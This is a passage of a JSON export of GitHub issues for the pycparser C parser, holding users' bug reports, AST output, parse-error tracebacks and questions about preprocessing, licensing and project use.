\r\n`function(level0.level1.array)`\r\nI have this output:\r\n\r\n```python\r\n...\r\n\r\nFuncCall(name=ID(name='function'\r\n                 ),\r\n         args=ExprList(exprs=[StructRef(name=StructRef(name=ID(name='level0'\r\n                                                               ),\r\n                                                       type='.',\r\n                                                       field=ID(name='level1'\r\n                                                                )\r\n                                                       ),\r\n                                        type='.',\r\n                                        field=ID(name='array'\r\n                                                 )\r\n                                        )\r\n                             ]\r\n                       )\r\n         ),\r\n\r\n...\r\n```\r\nJust after level0, we have the type then we go to level1. But after level1, we close the parenthesis twice ... Is it normal ? I imagined something like that:\r\n\r\n```python\r\n...\r\n\r\nFuncCall(name=ID(name='function'\r\n                 ),\r\n         args=ExprList(exprs=[StructRef(name=StructRef(name=ID(name='level0'\r\n                                                               ),\r\n                                                       type='.',\r\n                                                       field=ID(name='level1'\r\n                                                                ),\r\n                                                       type='.',\r\n                                                       field=ID(name='array'\r\n                                                              )\r\n                                        ),\r\n                             ]\r\n                       )\r\n         ),\r\n\r\n...\r\n```\r\nI thank you in advance!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/373", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/373/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/373/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/373/events", "html_url": "https://github.com/eliben/pycparser/issues/373", "id": 606783106, "node_id": "MDU6SXNzdWU2MDY3ODMxMDY=", "number": 373, "title": "feat: support code snippet", "user": {"login": "yxliang01", "id": 9780746, "node_id": "MDQ6VXNlcjk3ODA3NDY=", "avatar_url": "https://avatars3.githubusercontent.com/u/9780746?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yxliang01", "html_url": "https://github.com/yxliang01", "followers_url": "https://api.github.com/users/yxliang01/followers", "following_url": "https://api.github.com/users/yxliang01/following{/other_user}", "gists_url": "https://api.github.com/users/yxliang01/gists{/gist_id}", "starred_url": "https://api.github.com/users/yxliang01/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yxliang01/subscriptions", "organizations_url": "https://api.github.com/users/yxliang01/orgs", "repos_url": "https://api.github.com/users/yxliang01/repos", "events_url": "https://api.github.com/users/yxliang01/events{/privacy}", "received_events_url": "https://api.github.com/users/yxliang01/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-04-25T14:39:39Z", "updated_at": "2020-04-26T09:26:34Z", "closed_at": "2020-04-25T14:59:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "Would be nice if pycparser can support parsing C code snippet. For example, the following is a valid C code snippet but pycparser cannot parse as it only supports parsing file-level C code (as far as I think).\r\n\r\n```c\r\nif (1) {}\r\n```\r\n\r\nThe example above cannot be parsed by pycparser 2.20 .", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/372", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/372/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/372/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/372/events", "html_url": "https://github.com/eliben/pycparser/issues/372", "id": 590884407, "node_id": "MDU6SXNzdWU1OTA4ODQ0MDc=", "number": 372, "title": "Commercial Usage", "user": {"login": "hi2rashid", "id": 10250923, "node_id": "MDQ6VXNlcjEwMjUwOTIz", "avatar_url": "https://avatars1.githubusercontent.com/u/10250923?v=4", "gravatar_id": "", "url": "https://api.github.com/users/hi2rashid", "html_url": "https://github.com/hi2rashid", "followers_url": "https://api.github.com/users/hi2rashid/followers", "following_url": "https://api.github.com/users/hi2rashid/following{/other_user}", "gists_url": "https://api.github.com/users/hi2rashid/gists{/gist_id}", "starred_url": "https://api.github.com/users/hi2rashid/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hi2rashid/subscriptions", "organizations_url": "https://api.github.com/users/hi2rashid/orgs", "repos_url": "https://api.github.com/users/hi2rashid/repos", "events_url": "https://api.github.com/users/hi2rashid/events{/privacy}", "received_events_url": "https://api.github.com/users/hi2rashid/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-31T07:59:41Z", "updated_at": "2020-03-31T13:05:42Z", "closed_at": "2020-03-31T13:05:41Z", "author_association": "NONE", "active_lock_reason": null, "body": "\r\nWe are using this module https://github.com/eliben/pycparser in our application with Django.\r\n\r\nCan you please confirm if its okay to be used commercially.\r\n\r\nThank you in advance", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/371", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/371/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/371/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/371/events", "html_url": "https://github.com/eliben/pycparser/issues/371", "id": 589578166, "node_id": "MDU6SXNzdWU1ODk1NzgxNjY=", "number": 371, "title": "AttributeError: 'ID' object has no attribute 'type'", "user": {"login": "BelgacemNajib", "id": 52910433, "node_id": "MDQ6VXNlcjUyOTEwNDMz", "avatar_url": "https://avatars1.githubusercontent.com/u/52910433?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BelgacemNajib", "html_url": "https://github.com/BelgacemNajib", "followers_url": "https://api.github.com/users/BelgacemNajib/followers", "following_url": "https://api.github.com/users/BelgacemNajib/following{/other_user}", "gists_url": "https://api.github.com/users/BelgacemNajib/gists{/gist_id}", "starred_url": "https://api.github.com/users/BelgacemNajib/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BelgacemNajib/subscriptions", "organizations_url": "https://api.github.com/users/BelgacemNajib/orgs", "repos_url": "https://api.github.com/users/BelgacemNajib/repos", "events_url": "https://api.github.com/users/BelgacemNajib/events{/privacy}", "received_events_url": "https://api.github.com/users/BelgacemNajib/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-28T13:32:11Z", "updated_at": "2020-03-28T13:39:41Z", "closed_at": "2020-03-28T13:39:41Z", "author_association": "NONE", "active_lock_reason": null, "body": "i need to lint my code that contains a lots of function defined like : \r\n\r\nint function( myString )\r\nchar* myString ;{\r\n// code here\r\n}\r\n\r\nmy gcc is able to compile this kind of prototype but pycparser returns this error : \r\n-----------------------------------------------------------------------------------------\r\nTraceback (most recent call last):\r\n  File \"testLinter.py\", line 88, in <module>\r\n    show_func_defs(filename)\r\n  File \"testLinter.py\", line 79, in show_func_defs\r\n    v.visit(ast)\r\n  File \"Python37\\lib\\site-packages\\pycparser\\c_ast.py\", line 158, in visit\r\n    return visitor(node)\r\n  File \"Python37\\lib\\site-packages\\pycparser\\c_ast.py\", line 165, in generic_visit\r\n    self.visit(c)\r\n  File \"Python37\\lib\\site-packages\\pycparser\\c_ast.py\", line 158, in visit\r\n    return visitor(node)\r\n  File \"testLinter.py\", line 43, in visit_FuncDef\r\n    if type(params.type) is c_ast.PtrDecl:\r\nAttributeError: 'ID' object has no attribute 'type'\r\n--------------------------------------------------------------------------------------------------------\r\n\r\nany help please \r\nthank you ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/370", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/370/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/370/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/370/events", "html_url": "https://github.com/eliben/pycparser/issues/370", "id": 587424411, "node_id": "MDU6SXNzdWU1ODc0MjQ0MTE=", "number": 370, "title": "i wanna convert ast to cfg, but i have no idea,cause im not a coumputer professional student, can you give me some adivce?", "user": {"login": "leslielee619", "id": 27109334, "node_id": "MDQ6VXNlcjI3MTA5MzM0", "avatar_url": "https://avatars2.githubusercontent.com/u/27109334?v=4", "gravatar_id": "", "url": "https://api.github.com/users/leslielee619", "html_url": "https://github.com/leslielee619", "followers_url": "https://api.github.com/users/leslielee619/followers", "following_url": "https://api.github.com/users/leslielee619/following{/other_user}", "gists_url": "https://api.github.com/users/leslielee619/gists{/gist_id}", "starred_url": "https://api.github.com/users/leslielee619/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/leslielee619/subscriptions", "organizations_url": "https://api.github.com/users/leslielee619/orgs", "repos_url": "https://api.github.com/users/leslielee619/repos", "events_url": "https://api.github.com/users/leslielee619/events{/privacy}", "received_events_url": "https://api.github.com/users/leslielee619/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-25T03:55:54Z", "updated_at": "2020-03-25T12:20:00Z", "closed_at": "2020-03-25T12:20:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "hello dear friend,\r\nim major in mechinesm, but you know that  you could select courses no matter which college you are in, so i select a class which name <Software source code analysis> \uff0c just cause i ever used pyqt5, so im happy to take a class ,and feel sad when the teacher give us a Semester assignment.\r\nhe want us to analysis a c code and get the cfg and du path.\r\nim major in mechinsm, and im familiar with my profeesinal courses and python\uff0cbut i don know about compilation principle.\r\nso i try to find how to solve my assignment in github , in stackflow and so on. i find  your package could generate an ast.\r\nand now i want to convert it to cfg, so i want get your views about this.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/369", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/369/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/369/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/369/events", "html_url": "https://github.com/eliben/pycparser/issues/369", "id": 578502220, "node_id": "MDU6SXNzdWU1Nzg1MDIyMjA=", "number": 369, "title": "Not able to parse my header file", "user": {"login": "XaviLC", "id": 13626231, "node_id": "MDQ6VXNlcjEzNjI2MjMx", "avatar_url": "https://avatars3.githubusercontent.com/u/13626231?v=4", "gravatar_id": "", "url": "https://api.github.com/users/XaviLC", "html_url": "https://github.com/XaviLC", "followers_url": "https://api.github.com/users/XaviLC/followers", "following_url": "https://api.github.com/users/XaviLC/following{/other_user}", "gists_url": "https://api.github.com/users/XaviLC/gists{/gist_id}", "starred_url": "https://api.github.com/users/XaviLC/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/XaviLC/subscriptions", "organizations_url": "https://api.github.com/users/XaviLC/orgs", "repos_url": "https://api.github.com/users/XaviLC/repos", "events_url": "https://api.github.com/users/XaviLC/events{/privacy}", "received_events_url": "https://api.github.com/users/XaviLC/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-03-10T11:08:15Z", "updated_at": "2020-03-12T12:05:30Z", "closed_at": "2020-03-12T12:05:30Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello, \r\n\r\nI am facing an issue when try to create a parser for my header file called _Debug.h_ as shown below. However I cannot understand the error itself, could you explain me what the error is trying to say? Is the backslash associated to the comments in _Debug.h_ an issue for the parser?\r\n\r\nThanks in advance,\r\n\r\n\r\n\r\n```\r\nfileName = \"C:\\\\LocalData\\\\Projects\\\\git\\\\firmware\\\\SDR\\\\Common\\\\Debug.h\"\r\nast = parse_file(fileName, use_cpp=False)\r\n\r\nast = parse_file(fileName, use_cpp=False)\r\nTraceback (most recent call last):\r\n  File \"C:\\LocalData\\WPy64-3810\\python-3.8.1.amd64\\lib\\site-packages\\IPython\\core\\interactiveshell.py\", line 3319, in run_code\r\n    exec(code_obj, self.user_global_ns, self.user_ns)\r\n  File \"<ipython-input-37-9c4431fc25a6>\", line 1, in <module>\r\n    ast = parse_file(fileName, use_cpp=False)\r\n  File \"C:\\LocalData\\WPy64-3810\\python-3.8.1.amd64\\lib\\site-packages\\pycparser\\__init__.py\", line 90, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"C:\\LocalData\\WPy64-3810\\python-3.8.1.amd64\\lib\\site-packages\\pycparser\\c_parser.py\", line 149, in parse\r\n    return self.cparser.parse(\r\n  File \"C:\\LocalData\\WPy64-3810\\python-3.8.1.amd64\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"C:\\LocalData\\WPy64-3810\\python-3.8.1.amd64\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"C:\\LocalData\\WPy64-3810\\python-3.8.1.amd64\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"C:\\LocalData\\WPy64-3810\\python-3.8.1.amd64\\lib\\site-packages\\pycparser\\c_parser.py\", line 1845, in p_error\r\n    self._parse_error(\r\n  File \"C:\\LocalData\\WPy64-3810\\python-3.8.1.amd64\\lib\\site-packages\\pycparser\\plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: C:\\LocalData\\Projects\\git\\firmware\\SDR\\Common\\Debug.h:1:1: before: /\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/367", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/367/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/367/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/367/events", "html_url": "https://github.com/eliben/pycparser/issues/367", "id": 576696197, "node_id": "MDU6SXNzdWU1NzY2OTYxOTc=", "number": 367, "title": "Running Pycparser on entire repository", "user": {"login": "shubhamrsangle", "id": 36818228, "node_id": "MDQ6VXNlcjM2ODE4MjI4", "avatar_url": "https://avatars2.githubusercontent.com/u/36818228?v=4", "gravatar_id": "", "url": "https://api.github.com/users/shubhamrsangle", "html_url": "https://github.com/shubhamrsangle", "followers_url": "https://api.github.com/users/shubhamrsangle/followers", "following_url": "https://api.github.com/users/shubhamrsangle/following{/other_user}", "gists_url": "https://api.github.com/users/shubhamrsangle/gists{/gist_id}", "starred_url": "https://api.github.com/users/shubhamrsangle/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/shubhamrsangle/subscriptions", "organizations_url": "https://api.github.com/users/shubhamrsangle/orgs", "repos_url": "https://api.github.com/users/shubhamrsangle/repos", "events_url": "https://api.github.com/users/shubhamrsangle/events{/privacy}", "received_events_url": "https://api.github.com/users/shubhamrsangle/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-06T04:48:18Z", "updated_at": "2020-03-06T13:19:32Z", "closed_at": "2020-03-06T13:19:32Z", "author_association": "NONE", "active_lock_reason": null, "body": "No, there's no magic solution. You have to do it the way the blog post described. Typical projects using pycparser apply it to a small number of code-bases, so this is just a one time \"start up cost\" that gets amortized over the lifetime of the project.\r\n\r\nIt's not clear to me what you mean by \"can't pre-process every file one by one\". The compiler compiles a project \"every file one by one\", so pycparser would need to analyze each project in the same way.\r\n\r\n_Originally posted by @eliben in https://github.com/eliben/pycparser/issues/361#issuecomment-581904058_\r\n\r\nI don't need any magic solution, just need to know that can this be automated by script or have to do everything manually? By \"can't pre-process every file one by one\", I mean that I can't do it manually for every file in repository. There will be thousands of file in project, how can I do it manually for every file? ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/366", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/366/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/366/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/366/events", "html_url": "https://github.com/eliben/pycparser/issues/366", "id": 575179486, "node_id": "MDU6SXNzdWU1NzUxNzk0ODY=", "number": 366, "title": "voidpf not defined by fake_lib/zlib.h", "user": {"login": "thoni56", "id": 204496, "node_id": "MDQ6VXNlcjIwNDQ5Ng==", "avatar_url": "https://avatars3.githubusercontent.com/u/204496?v=4", "gravatar_id": "", "url": "https://api.github.com/users/thoni56", "html_url": "https://github.com/thoni56", "followers_url": "https://api.github.com/users/thoni56/followers", "following_url": "https://api.github.com/users/thoni56/following{/other_user}", "gists_url": "https://api.github.com/users/thoni56/gists{/gist_id}", "starred_url": "https://api.github.com/users/thoni56/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/thoni56/subscriptions", "organizations_url": "https://api.github.com/users/thoni56/orgs", "repos_url": "https://api.github.com/users/thoni56/repos", "events_url": "https://api.github.com/users/thoni56/events{/privacy}", "received_events_url": "https://api.github.com/users/thoni56/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2020-03-04T06:59:26Z", "updated_at": "2020-03-11T12:46:34Z", "closed_at": "2020-03-11T12:46:34Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Standard `zlib.h` defines `voidpf` which is not defined by `fake_typedefs.h`. I suppose that since `fake_lib` catches `zlib.h` so should define all things in `/usr/include/zlib.h` and thus `/usr/include/zconf.h`.\r\n\r\nMy hack for fixing it for me was to send the following CPP arguments:\r\n\r\n    -Dvoidpf=int -DuInt=int", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/365", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/365/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/365/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/365/events", "html_url": "https://github.com/eliben/pycparser/issues/365", "id": 574718454, "node_id": "MDU6SXNzdWU1NzQ3MTg0NTQ=", "number": 365, "title": "Release version 2.20", "user": {"login": "eliben", "id": 1130906, "node_id": "MDQ6VXNlcjExMzA5MDY=", "avatar_url": "https://avatars3.githubusercontent.com/u/1130906?v=4", "gravatar_id": "", "url": "https://api.github.com/users/eliben", "html_url": "https://github.com/eliben", "followers_url": "https://api.github.com/users/eliben/followers", "following_url": "https://api.github.com/users/eliben/following{/other_user}", "gists_url": "https://api.github.com/users/eliben/gists{/gist_id}", "starred_url": "https://api.github.com/users/eliben/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/eliben/subscriptions", "organizations_url": "https://api.github.com/users/eliben/orgs", "repos_url": "https://api.github.com/users/eliben/repos", "events_url": "https://api.github.com/users/eliben/events{/privacy}", "received_events_url": "https://api.github.com/users/eliben/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-03-03T14:45:04Z", "updated_at": "2020-03-09T12:52:24Z", "closed_at": "2020-03-09T12:52:24Z", "author_association": "OWNER", "active_lock_reason": null, "body": "This is a planning issue for releasing version 2.20\r\n\r\nFor #359 I will try to push a wheel with this release. Also, there hasn't been a release since Sep 2018, so it's time.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/363", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/363/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/363/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/363/events", "html_url": "https://github.com/eliben/pycparser/issues/363", "id": 570247911, "node_id": "MDU6SXNzdWU1NzAyNDc5MTE=", "number": 363, "title": "Incorrect AST structure when parsing `offsetof` expressions.", "user": {"login": "huzecong", "id": 5766101, "node_id": "MDQ6VXNlcjU3NjYxMDE=", "avatar_url": "https://avatars1.githubusercontent.com/u/5766101?v=4", "gravatar_id": "", "url": "https://api.github.com/users/huzecong", "html_url": "https://github.com/huzecong", "followers_url": "https://api.github.com/users/huzecong/followers", "following_url": "https://api.github.com/users/huzecong/following{/other_user}", "gists_url": "https://api.github.com/users/huzecong/gists{/gist_id}", "starred_url": "https://api.github.com/users/huzecong/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/huzecong/subscriptions", "organizations_url": "https://api.github.com/users/huzecong/orgs", "repos_url": "https://api.github.com/users/huzecong/repos", "events_url": "https://api.github.com/users/huzecong/events{/privacy}", "received_events_url": "https://api.github.com/users/huzecong/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-02-25T01:20:32Z", "updated_at": "2020-03-27T16:32:17Z", "closed_at": "2020-03-03T14:33:13Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I am using the latest commit on `master` branch (`1166ea1`).\r\n\r\nTake the following code as example:\r\n```c\r\nint x = offsetof(struct A, a.b);\r\n```\r\nThe generated parse tree is:\r\n```python\r\nFileAST(ext=[Decl(name='x',\r\n                  quals=[],\r\n                  storage=[],\r\n                  funcspec=[],\r\n                  type=TypeDecl(declname='x',\r\n                                quals=[],\r\n                                type=IdentifierType(names=['int'])),\r\n                  init=FuncCall(name=ID(name='offsetof'),\r\n                                args=ExprList(exprs=[Typename(name=None,\r\n                                                              quals=[],\r\n                                                              type=TypeDecl(declname=None,\r\n                                                                            quals=[],\r\n                                                                            type=Struct(name='A',\r\n                                                                                        decls=None))),\r\n                                                     StructRef(name=ID(name='a'),\r\n                                                               type='.',\r\n                                                               field=ID(name=ID(name='b')))])),\r\n                  bitsize=None)])\r\n```\r\nwhere the `field` attribute of `StructRef` has a value of `ID(name=ID(name='b'))` instead of just `ID(name='b')`.\r\n\r\nI think the issue is with the production rules of `offsetof_member_designator` that was introduced in #145, namely:\r\nhttps://github.com/eliben/pycparser/blob/1166ea11785ce12cdfd5e8bf8b3a69b5e6b76f9c/pycparser/c_parser.py#L1735-L1748\r\nIn the `len(p) == 4` case, `StructRef` should be created using `p[3]` directly, instead of constructing an `ID` first.\r\n\r\nIf you agree with my analysis, I'd be happy to create a patch.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/362", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/362/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/362/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/362/events", "html_url": "https://github.com/eliben/pycparser/issues/362", "id": 562122415, "node_id": "MDU6SXNzdWU1NjIxMjI0MTU=", "number": 362, "title": "Error  inside _fake_typedefs.h file on the line containing void* declaration while running parse_file function", "user": {"login": "shubhamrsangle", "id": 36818228, "node_id": "MDQ6VXNlcjM2ODE4MjI4", "avatar_url": "https://avatars2.githubusercontent.com/u/36818228?v=4", "gravatar_id": "", "url": "https://api.github.com/users/shubhamrsangle", "html_url": "https://github.com/shubhamrsangle", "followers_url": "https://api.github.com/users/shubhamrsangle/followers", "following_url": "https://api.github.com/users/shubhamrsangle/following{/other_user}", "gists_url": "https://api.github.com/users/shubhamrsangle/gists{/gist_id}", "starred_url": "https://api.github.com/users/shubhamrsangle/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/shubhamrsangle/subscriptions", "organizations_url": "https://api.github.com/users/shubhamrsangle/orgs", "repos_url": "https://api.github.com/users/shubhamrsangle/repos", "events_url": "https://api.github.com/users/shubhamrsangle/events{/privacy}", "received_events_url": "https://api.github.com/users/shubhamrsangle/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-02-09T04:58:37Z", "updated_at": "2020-02-11T00:23:43Z", "closed_at": "2020-02-11T00:23:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "Python 3.6.10 (default, Dec 19 2019, 23:04:32) \r\n[GCC 5.4.0 20160609] on linux\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n>>> import pycparser\r\n>>> pycparser.parse_file('run_pp.c')\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/__init__.py\", line 90, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/c_parser.py\", line 1862, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: utils/fake_libc_include/_fake_typedefs.h:156:9: before: 1\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/361", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/361/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/361/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/361/events", "html_url": "https://github.com/eliben/pycparser/issues/361", "id": 559537203, "node_id": "MDU6SXNzdWU1NTk1MzcyMDM=", "number": 361, "title": "Running pycparser on entire project repositories", "user": {"login": "shubhamrsangle", "id": 36818228, "node_id": "MDQ6VXNlcjM2ODE4MjI4", "avatar_url": "https://avatars2.githubusercontent.com/u/36818228?v=4", "gravatar_id": "", "url": "https://api.github.com/users/shubhamrsangle", "html_url": "https://github.com/shubhamrsangle", "followers_url": "https://api.github.com/users/shubhamrsangle/followers", "following_url": "https://api.github.com/users/shubhamrsangle/following{/other_user}", "gists_url": "https://api.github.com/users/shubhamrsangle/gists{/gist_id}", "starred_url": "https://api.github.com/users/shubhamrsangle/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/shubhamrsangle/subscriptions", "organizations_url": "https://api.github.com/users/shubhamrsangle/orgs", "repos_url": "https://api.github.com/users/shubhamrsangle/repos", "events_url": "https://api.github.com/users/shubhamrsangle/events{/privacy}", "received_events_url": "https://api.github.com/users/shubhamrsangle/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-02-04T07:32:32Z", "updated_at": "2020-02-04T13:14:53Z", "closed_at": "2020-02-04T13:14:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "I needed to use pycparser project so I went through this blog https://eli.thegreenplace.net/2015/on-parsing-c-type-declarations-and-fake-headers\r\n\r\nBy, going through this, I realized that it's very tough to run this project on some big project, which I actually need too do. As in blog you showed that we need to tackle every header problem one by one and we are knowing about what to include in this pre-processing command  after getting error one by one\r\n\r\ngcc -nostdinc -E -D'__attribute__(x)=' -Iredis/src \\\r\n                   -Ipycparser/utils/fake_libc_include \\\r\n                   -Iredis/deps/lua/src redis/src/redis.c > redis_pp.c\r\n\r\nCan you help me by giving some script or pointing me to some script if I want to run it on  every file of some repository as we can't pre-process every file one by one.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/360", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/360/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/360/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/360/events", "html_url": "https://github.com/eliben/pycparser/issues/360", "id": 549468408, "node_id": "MDU6SXNzdWU1NDk0Njg0MDg=", "number": 360, "title": "Generator generates incorrect AST for a function with return type 'void*'", "user": {"login": "yevka", "id": 37955368, "node_id": "MDQ6VXNlcjM3OTU1MzY4", "avatar_url": "https://avatars3.githubusercontent.com/u/37955368?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yevka", "html_url": "https://github.com/yevka", "followers_url": "https://api.github.com/users/yevka/followers", "following_url": "https://api.github.com/users/yevka/following{/other_user}", "gists_url": "https://api.github.com/users/yevka/gists{/gist_id}", "starred_url": "https://api.github.com/users/yevka/starred{/owner}{/repo}", "subscriptions_url": 